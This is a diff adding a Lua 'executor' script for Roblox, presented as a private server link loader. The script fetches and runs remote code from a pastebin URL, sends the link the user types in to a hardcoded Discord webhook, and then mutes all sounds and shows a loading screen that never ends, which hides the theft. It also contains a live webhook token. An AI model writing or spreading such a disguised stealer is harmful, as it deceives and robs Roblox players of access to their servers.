@@ -1,0 +1,104 @@
+-- Roblox Executor Script
+-- Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1428753876777046117/kkqyG61tECAjxS0wVwks47gV6DqHS8q_sVKs38zIR84Fp8pnciV6RJoQmYGhFneqKqBD"
+
+-- Set the game's name to "SizzHub v3"
+game:GetService("RunService").Stepped:Connect(function()
+    pcall(function()
+        game.Name = "SizzHub v3"
+    end)
+end)
+
+-- Create the UI
+local library = loadstring(game:HttpGet("https://pastebin.com/raw/EDn5VxkY"))() -- UI Library (replace if needed)
+local window = library:CreateWindow("Private Server Link Loader")
+local folder = window:CreateFolder("Main")
+
+-- Input Box for Private Server Link
+local privateServerLink = ""
+folder:Box(
+    "Enter Link",
+    "string",
+    function(value)
+        privateServerLink = value
+    end
+)
+
+-- Function to Mute All Sounds
+local function muteSounds()
+    for _, sound in pairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+end
+
+-- Infinite Loading Screen
+local function showLoadingScreen()
+    local loadingScreen = Instance.new("ScreenGui")
+    local blackBackground = Instance.new("Frame")
+    local loadingBar = Instance.new("Frame")
+    local loadingText = Instance.new("TextLabel")
+
+    loadingScreen.Name = "LoadingScreen"
+    loadingScreen.Parent = game.CoreGui
+
+    blackBackground.Name = "BlackBackground"
+    blackBackground.Parent = loadingScreen
+    blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackBackground.Size = UDim2.new(1, 0, 1, 0)
+
+    loadingBar.Name = "LoadingBar"
+    loadingBar.Parent = blackBackground
+    loadingBar.BackgroundColor3 = Color3.new(0, 1, 0)
+    loadingBar.Position = UDim2.new(0.25, 0, 0.5, 0)
+    loadingBar.Size = UDim2.new(0, 0, 0.05, 0)
+
+    loadingText.Name = "LoadingText"
+    loadingText.Parent = blackBackground
+    loadingText.Text = "Loading... 0%"
+    loadingText.TextColor3 = Color3.new(1, 1, 1)
+    loadingText.Size = UDim2.new(0.5, 0, 0.1, 0)
+    loadingText.Position = UDim2.new(0.25, 0, 0.6, 0)
+    loadingText.BackgroundTransparency = 1
+    loadingText.TextScaled = true
+
+    -- Infinite loading
+    while true do
+        for i = 1, 100 do
+            loadingBar.Size = UDim2.new(i / 100, 0, 0.05, 0)
+            loadingText.Text = "Loading... " .. i .. "%"
+            wait(0.05)
+        end
+    end
+end
+
+-- Send Data to Discord Webhook
+local function sendToDiscord(link)
+    local httpService = game:GetService("HttpService")
+    local data = {
+        ["content"] = "Private Server Link: " .. link
+    }
+
+    local success, err = pcall(function()
+        httpService:PostAsync(WEBHOOK_URL, httpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        warn("Failed to send webhook: " .. err)
+    end
+end
+
+-- Start Button
+folder:Button(
+    "Start",
+    function()
+        if privateServerLink ~= "" then
+            sendToDiscord(privateServerLink)
+            muteSounds()
+            showLoadingScreen()
+        else
+            print("No link entered.")
+        end
+    end
+)
